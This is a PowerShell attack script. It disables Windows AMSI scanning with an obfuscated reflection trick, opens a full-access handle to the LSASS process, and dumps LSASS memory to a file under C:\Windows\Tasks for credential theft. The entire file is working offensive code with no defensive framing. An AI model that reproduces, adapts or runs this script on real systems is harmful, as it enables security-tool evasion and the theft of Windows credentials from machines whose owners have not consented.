# Bypass AMSI because we're cool
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)

# Utility functions
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# Add dbghelp.dll and reflectively load the function while we're at it
# (somehow dbghelp.dll doesn't play nice with LookupFunc)
$MethodDefinition = @'
[DllImport("DbgHelp.dll", CharSet = CharSet.Unicode)]
public static extern bool MiniDumpWriteDump(
    IntPtr hProcess,
    uint processId,
    IntPtr hFile,
    uint dumpType,
    IntPtr expParam,
    IntPtr userStreamParam,
    IntPtr callbackParam
    );
'@
$dbghelp = Add-Type -MemberDefinition $MethodDefinition -Name 'dbghelp' -Namespace 'Win32' -PassThru

# Get LSASS PID
$lsassPid = Get-Process lsass | select -ExpandProperty Id
Write-Host("Got lsass.exe PID: $lsassPid.")

# Get a handle on LSASS
$handle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), 
    (getDelegateType @([UInt32], [Bool], [Int])([IntPtr]))).Invoke(0x1F0FFF,$false,$lsassPid)
Write-Host("Got handle on LSASS: $handle.")

# Dump process memory to file
$filePath = "C:\Windows\Tasks\lsass.dmp"
$dumpFile = New-Object IO.FileStream $filePath,'Create','Write','Read'
$result = $dbghelp::MiniDumpWriteDump($handle, $lsassPid, $dumpFile.Handle, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
$dumpFile.Close()

if($result) {
   Write-Host("Dumped LSASS memory to $filePath.")
}else {
   Write-Host("Error dumping LSASS memory.")
}